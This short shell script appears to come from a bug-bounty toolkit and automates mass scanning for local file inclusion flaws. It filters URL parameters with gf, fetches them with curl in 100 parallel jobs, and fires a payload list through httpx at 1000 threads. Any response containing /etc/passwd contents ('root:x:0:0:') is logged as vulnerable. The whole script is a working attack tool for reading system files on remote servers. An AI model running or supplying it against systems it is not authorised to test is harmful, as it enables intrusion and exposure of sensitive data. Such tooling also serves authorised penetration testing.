#!/bin/zsh

#TARGET=$1

#------------------------------------------------#
echo -e "[+] Start gf lfi v1 [+]"
#------------------------------------------------#
cat parameters.txt | gf lfi | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | anew -q lfiPatterns.txt
#------------------------------------------------#
echo -e "[+] Start lfi v2 [+]"
#------------------------------------------------#
cat lfiPatterns.txt | xargs -P 100 -I % bash -c "curl -s -L '%' | grep \"root:\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q lfi.txt &> /dev/null
#------------------------------------------------#
echo -e "[+] Start lfi v3 [+]"
#------------------------------------------------#
httpx -l lfiPatterns.txt -paths lfi-payloads.txt -threads 1000 -random-agent -x GET,POST,PUT -tech-detect -status-code -follow-redirects -title -mc 200 -match-regex "root:[x*]:0:0:"
#------------------------------------------------#
rm lfiPatterns.txt
